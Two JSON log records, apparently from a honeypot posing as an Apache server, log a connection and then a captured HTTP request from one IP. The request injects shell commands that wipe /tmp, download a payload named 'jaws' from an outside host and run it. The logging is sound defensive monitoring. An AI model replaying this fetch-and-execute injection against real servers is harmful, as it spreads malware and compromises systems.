{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"connection","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"2023-02-25T06:32:00.721965","parsedMessage":{"timestamp":"2023-02-25 06:32:00.721965","message_type":null,"correlation_id":null,"level":"INFO","message":"connection-log connection from 175.183.60.200:37198 to port 80","ip":"175.183.60.200"},"id":"a315bb7d-2d49-4f72-a7a5-614429c07798","EventProcessedUtcTime":"2023-02-25T06:32:01.2573679Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-02-25T06:32:01.0100000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/175.183.60.200"}
{"customerid":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413","honeyserverid":"2102ac15-bf5e-456c-ab63-90cb836ed7ad","logkind":"honeypot","honeypotid":"8BE585FB-2F2F-4BC6-8848-4165C1C4AA46","honeypotname":"apache-server","time":"Sat Feb 25 06:32:01 UTC 2023","parsedMessage":{"timestamp":"2023-02-25 06:32:00+00:00","message_type":"http-access","correlation_id":null,"level":"WARNING","message":"175.183.60.200 - - \"GET /shell?cd+/tmp;rm+-rf+*;wget+ 107.6.255.132/jaws;sh+/tmp/jaws\" 400 0 \"-\" \"-\"","ip":"175.183.60.200"},"id":"6764141b-b5fa-4bab-afcc-b4472460e8ce","EventProcessedUtcTime":"2023-02-25T06:32:02.0241059Z","PartitionId":0,"EventEnqueuedUtcTime":"2023-02-25T06:32:01.9950000Z","path":"D495D9BB-0F5F-4945-9B2D-F90CAD90E413/2102ac15-bf5e-456c-ab63-90cb836ed7ad/apache-server/175.183.60.200"}